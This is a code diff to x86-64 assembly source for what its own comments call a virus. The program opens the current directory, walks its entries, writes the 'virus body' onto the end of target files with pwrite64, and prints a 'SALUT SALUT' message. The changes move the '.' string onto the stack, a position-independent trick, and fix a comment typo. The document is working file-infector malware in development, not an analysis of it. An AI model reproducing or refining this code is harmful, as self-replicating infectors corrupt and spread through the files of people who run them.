@@ -3,12 +3,6 @@
 section .text
   global _start
 
-section .data
-dot db '.',0x0
-dot_len equ $ - dot
-n db 0xa
-n_len equ $ - n
-
 section .text
 
 _start:
@@ -19,12 +13,14 @@ _start:
   mov r15, rsp ; r15 will be the base of our stack
 
   ; --- Open "."
-  lea rdi, [dot] ; mov "." into rdi
+  push "." ; push "." to stack (rsp)
+  mov rdi, rsp
   mov rsi, O_RDONLY ; 
   xor rdx, rdx ;  no flags
   mov rax, SYS_OPEN ;
   syscall ; open
 
+  pop rdi ; pop the "." we pushed earlier
   cmp rax, 0
   jl cleanup
 
@@ -150,7 +146,7 @@ _start:
       
       ; write virus body to the end of the file
       mov rdi, r9 ; load fd
-      lea rsi, [rbp + _start] ; load _start addres in rsi
+      lea rsi, [rbp + _start] ; load _start address in rsi
       mov rdx, v_stop - _start; virus size
       mov r10, rax ; load target EOF into r10
       mov rax, SYS_PWRITE64
@@ -246,6 +242,18 @@ _start:
       add cx, word [rcx + r15 + DIRENT_D_RECLEN]
       cmp rcx, [r15 + DIR_SIZE]
       jl .loop_directory
+
+call show_msg
+info_msg:
+  db 'SALUT SALUT', 0xa
+  info_len equ $ - info_msg
+
+  show_msg:
+    pop rsi
+    mov rax, SYS_WRITE
+    mov rdi, STDOUT
+    mov rdx, info_len
+    syscall
 
 cleanup:
   ; restore signals ?
